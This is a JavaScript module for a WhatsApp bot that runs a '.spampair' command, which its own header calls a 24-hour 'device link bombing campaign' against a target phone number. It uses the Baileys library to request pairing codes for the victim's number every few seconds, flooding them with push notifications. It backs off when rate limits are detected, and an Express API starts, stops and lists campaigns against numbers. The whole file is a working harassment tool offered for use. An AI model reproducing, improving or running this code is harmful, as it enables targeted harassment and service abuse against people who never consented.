// ============================================================
// MODULE: spampair.js
// WhatsApp Bot command: .spampair <phone_number>
// Starts a 24-hour device link bombing campaign against the target
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_HOURS = 24;
const REQUEST_DELAY_MIN_MS = 1200;
const REQUEST_DELAY_MAX_MS = 3000;

// ---------- STATE ----------
const activeCampaigns = new Map(); // phone -> { spamPair, stopFlag, stats, startTime }

class SpamPair extends EventEmitter {
  constructor(phoneNumber, durationHours = DEFAULT_DURATION_HOURS) {
    super();
    this.phone = this._formatNumber(phoneNumber);
    this.durationMs = durationHours * 60 * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
    this._timer = null;
    this._baileys = null; // lazy-loaded
    this._browser = null; // lazy-loaded
  }

  // ---------- UTILITIES ----------
  _formatNumber(num) {
    let clean = String(num || '').replace(/\D/g, '');
    if (!clean.startsWith('91')) clean = '91' + clean;
    return clean;
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- SLEEP HELPER ----------
  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // ---------- LAZY LOAD BAILEYS ----------
  _ensureBaileys() {
    if (!this._baileys) {
      try {
        const baileys = require("@whiskeysockets/baileys");
        const { default: makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = baileys;
        this._baileys = { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers };
        this._browser = Browsers?.ubuntu('Chrome');
      } catch (_be) {
        throw new Error('Baileys library not available in this environment');
      }
    }
    return this._baileys;
  }

  // ---------- CORE ATTEMPT — uses baileys WebSocket to trigger real pairing notification ----------
  async _attemptLink() {
    let sock = null;
    try {
      const { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();

      // Create ephemeral in-memory auth credentials
      const authCreds = initAuthCreds();
      const state = {
        creds: authCreds,
        keys: { get: async () => null, set: async () => {}, delete: async () => {} }
      };

      const { version } = await fetchLatestBaileysVersion();

      // Create socket — baileys handles WebSocket connect + noise handshake internally
      sock = makeWASocket({
        version,
        browser: this._browser || Browsers.ubuntu('Chrome'),
        auth: {
          creds: state.creds,
          keys: state.keys
        },
        generateHighQualityLinkPreview: false,
        shouldSyncHistoryMessage: () => false,
        getMessage: async () => undefined,
        connectTimeoutMs: 12000,
        defaultQueryTimeoutMs: 12000,
        logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
      });

      // Wait 4 seconds for WebSocket connect + noise handshake (same approach as pair.js)
      // Important: 'connection:open' only fires after CB:success (authenticated login),
      // which never comes for fresh unregistered sockets. So we use a fixed delay.
      await this._sleep(4000);

      // Check if the socket's WebSocket is actually connected
      if (!sock.ws || !sock.ws.isOpen) {
        throw new Error('WebSocket not connected after 4s');
      }

      // Request pairing code — this sends the actual WhatsApp XML stanza
      // that triggers a push notification to the target phone
      const code = await sock.requestPairingCode(this.phone);

      this.stats.attempts++;
      this.stats.success++;
      this.emit('success', { phone: this.phone, attempt: this.stats.attempts, code });
      return true;

    } catch (error) {
      this.stats.attempts++;
      this.stats.errors++;
      const errMsg = String(error?.message || error || 'Unknown').slice(0, 120);

      // Rate limiting detection
      if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
        this.emit('rate-limit', { phone: this.phone, detail: errMsg });
        await this._sleep(10000);
      } else if (errMsg.includes('WebSocket not connected') || errMsg.includes('connect')) {
        // Connection issues — wait longer
        await this._sleep(6000);
      }

      return false;
    } finally {
      if (sock) {
        try { sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
      }
    }
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      const success = await this._attemptLink();
      
      // Emit progress every 10 attempts
      if (this.stats.attempts % 10 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      // Random delay between attempts
      await this._sleep(this._randomDelay());

      // Refresh session occasionally
      if (this.stats.attempts % 50 === 0) {
        this.sessionId = crypto.randomBytes(8).toString('hex');
      }
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  // ---------- START / STOP ----------
  start() {
    if (this._timer) {
      this.emit('error', { phone: this.phone, message: 'Already running' });
      return;
    }
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS API ROUTES
// ================================================================

const router = express.Router();

// ── POST /api/spampair/start ──────────────────────────────────────
// Body: { phoneNumber }
router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeCampaigns.has(cleanNumber)) {
    const campaign = activeCampaigns.get(cleanNumber);
    return res.json({
      status: 'already_running',
      phone: cleanNumber,
      stats: campaign.stats
    });
  }

  const campaign = new SpamPair(phoneNumber);
  activeCampaigns.set(cleanNumber, {
    spamPair: campaign,
    stats: campaign.stats,
    startTime: Date.now()
  });

  // Start the campaign (events are handled by case.js)
  campaign.start();

  res.json({
    status: 'started',
    phone: cleanNumber,
    sessionId: campaign.sessionId,
    durationHours: DEFAULT_DURATION_HOURS
  });
});

// ── POST /api/spampair/stop ───────────────────────────────────────
// Body: { phoneNumber }
router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeCampaigns.has(cleanNumber)) {
    return res.status(404).json({ error: 'No active campaign for this number', phone: cleanNumber });
  }

  const entry = activeCampaigns.get(cleanNumber);
  entry.spamPair.stop();
  activeCampaigns.delete(cleanNumber);

  res.json({
    status: 'stopped',
    phone: cleanNumber,
    stats: entry.stats
  });
});

// ── GET /api/spampair/status ──────────────────────────────────────
router.get('/status', (req, res) => {
  if (activeCampaigns.size === 0) {
    return res.json({ campaigns: [] });
  }

  const campaigns = [];
  for (const [phone, entry] of activeCampaigns) {
    campaigns.push({
      phone,
      stats: entry.spamPair.getStats(),
      running: !entry.spamPair.stopFlag,
      startedAt: entry.startTime
    });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SpamPair = SpamPair;
module.exports.activeCampaigns = activeCampaigns;
